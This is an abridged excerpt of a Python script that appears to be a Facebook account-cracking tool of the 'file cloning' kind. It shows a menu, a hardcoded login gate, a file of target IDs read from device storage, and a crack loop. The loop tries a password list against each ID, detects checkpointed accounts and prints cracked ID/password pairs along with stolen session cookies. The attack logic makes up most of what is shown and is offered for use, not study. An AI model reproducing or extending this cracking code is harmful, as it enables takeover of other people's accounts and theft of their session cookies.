...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mRJR')
...
while attemps < 12345677901:
    ...
    if username == 'FFF' and password == 'GGG':
...
def login():
	banner()
	RJRj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	RJRj('\033[0;97m===============================================')
	RJR= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if RJR in ['m']:
		public()
	elif RJR in ['1']:
		crack_file()
		...
		os.system('xdg-open https://wa.me/+01732978573')
	elif RJR in ['0']:
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/RJR.txt  Etc...]')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[😻RJR😻] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#RJR-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•RJR-Cp] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
				...
				#RJR-King
				print(f'\r\033[0;92m[RJR-➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " RJR,  Ok,  id"')
